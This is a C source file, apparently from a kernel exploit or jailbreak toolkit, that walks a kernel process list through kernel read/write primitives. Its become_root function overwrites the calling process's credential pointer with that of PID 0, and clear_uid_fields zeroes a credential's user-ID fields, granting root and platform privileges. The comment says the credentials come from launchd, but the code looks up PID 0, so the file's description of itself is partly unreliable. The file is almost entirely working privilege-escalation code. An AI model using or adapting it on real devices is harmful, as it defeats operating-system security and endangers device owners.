#include <unistd.h>
#include <string.h>
#include "melatonin.h"
#include "offsets.h"

kva_t proc_find(pid_t want) {
    if (!mela_krw_ready()) return 0;

    kva_t proc = kread64(kaddr(g_off.allproc));
    int guard = 0;

    while (proc && guard++ < 0x4000) {
        kva_t cur = mela_canon(proc);
        uint32_t pid = (uint32_t)kread64(cur + g_off.proc_pid);
        if (pid == (uint32_t)want) return cur;

        kva_t next = kread64(cur + g_off.proc_list);
        if (!next) break;
        proc = mela_canon(next);
    }
    return 0;
}

int for_each_proc(int (*cb)(kva_t proc, void *arg), void *arg) {    if (!mela_krw_ready() || !cb) return -1;

    kva_t proc = kread64(kaddr(g_off.allproc));
    int guard = 0, n = 0;

    while (proc && guard++ < 0x4000) {
        kva_t cur = mela_canon(proc);
        if (cb(cur, arg) != 0) break;
        n++;

        kva_t next = kread64(cur + g_off.proc_list);
        if (!next) break;
        proc = mela_canon(next);
    }
    return n;
}

/* adopt launchd's cred including platform entitlements */
int become_root(void) {
    kva_t self = proc_find(getpid());
    kva_t kp   = proc_find(0);
    if (!self || !kp) return -1;

    kva_t k_ro   = kread64(kp + g_off.proc_ro);
    kva_t k_cred = kread64(k_ro + g_off.proc_ucred);
    if (!mela_is_kptr(k_cred)) return -1;

    kva_t s_ro = kread64(self + g_off.proc_ro);
    if (kwrite64(s_ro + g_off.proc_ucred, k_cred) != 0) return -1;

    g_mela.self_proc = self;
    g_mela.self_ucred = k_cred;
    g_mela.rootful = true;
    return 0;
}

int clear_uid_fields(kva_t ucred) {
    if (!mela_is_kptr(ucred)) return -1;
    kwrite64(ucred + g_off.ucred_uid,   0);
    kwrite64(ucred + g_off.ucred_ruid,  0);
    kwrite64(ucred + g_off.ucred_svuid, 0);
    return 0;
}

kva_t proc_find_by_name(const char *name) {
    if (!mela_krw_ready() || !name) return 0;

    kva_t proc = kread64(kaddr(g_off.allproc));
    int guard = 0;
    size_t want = strlen(name);

    while (proc && guard++ < 0x4000) {
        kva_t cur = mela_canon(proc);
        char comm[32] = {0};

        if (kread(cur + g_off.proc_comm, comm, sizeof comm - 1) == 0 &&
            strncmp(comm, name, want) == 0)
            return cur;

        kva_t next = kread64(cur + g_off.proc_list);
        if (!next) break;
        proc = mela_canon(next);
    }
    return 0;
}
